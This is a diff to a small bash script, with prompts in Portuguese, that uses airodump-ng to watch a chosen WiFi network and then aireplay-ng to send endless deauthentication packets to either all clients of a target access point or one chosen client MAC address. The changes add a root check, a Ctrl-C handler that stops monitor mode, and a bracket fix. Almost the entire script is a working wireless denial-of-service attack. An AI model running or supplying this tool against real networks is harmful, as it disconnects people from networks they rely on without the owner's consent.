@@ -1,5 +1,8 @@
 #!/bin/bash
-# if not root, run as root
+if (( $EUID != 0 )); then
+  echo -e "\nMust be run as root!"
+  exit 1
+fi
 echo
 echo
 echo " W   W   W || / I &   &   666  %%%%"
@@ -22,13 +25,23 @@ read channel
 airodump-ng mon0 --bssid $bssid --channel $channel
 echo -n "todos?(s/n)"
 read t
-if ["$t" = "s"]
+trap 'killall' INT
+killall() {
+	airmon-ng stop $mon
+	echo "**** You ended it ****"     # added double quotes
+	kill -TERM 0         # fixed order, send TERM not INT
+	wait
+}
+if [ "$t" = "s" ]
 then
-	aireplay-ng -0 0 -a $bssid mon0
-	break
+	echo "Depois desliga o monitor mode (# airmon-ng stop mondevice)"
+	for i in {3..1};do echo -n "$i." && sleep 1; done
+	aireplay-ng -0 0 -a $bssid $mon &
 else
 	echo -n "mac do cliente > "
 	read cliente
-	aireplay-ng -0 0 -a $bssid -c $cliente mon0
-	break
+	echo "Depois desliga o monitor mode (# airmon-ng stop *mondevice*)"
+	for i in {3..1};do echo -n "$i." && sleep 1; done
+	aireplay-ng -0 0 -a $bssid -c $cliente $mon
 fi
+cat
